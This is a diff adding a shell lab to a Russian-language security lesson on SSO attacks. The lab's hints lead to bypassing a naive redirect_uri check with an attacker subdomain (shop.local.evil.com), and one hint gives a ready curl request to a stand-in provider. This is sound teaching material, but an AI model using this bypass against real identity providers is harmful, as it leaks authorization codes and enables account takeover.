@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как ломают современный SSO: open redirect_uri, утечка кода, confusion, XSW в SAML и подмена subject."
+lab:
+  kind: shell
+  title: 'Практика: обход проверки redirect_uri'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Провайдер проверяет `redirect_uri` наивно — «начинается с разрешённого домена».'
+    - 'Полностью чужой домен отклоняется: `https://our-server.evil/callback`.'
+    - 'Используй поддомен, начинающийся с разрешённого: `https://shop.local.evil.com/callback`.'
+    - '`curl -s -i ''https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local.evil.com/callback&state=xyz123'' | tail -1 > found.txt`, затем `check`.'
 ---
 
 Всё чаще ты не вводишь пароль на сайте, а жмёшь «Войти через Google». Это **SSO** (Single Sign-On, единый вход): приложение доверяет вход стороннему провайдеру. Работает это по протоколам **OAuth2** (авторизация) и **OIDC** (аутентификация поверх OAuth2); в корпоративной среде — **SAML**. Ошибки в этих протоколах означают вход под кем угодно, поэтому они очень ценятся в bug bounty.
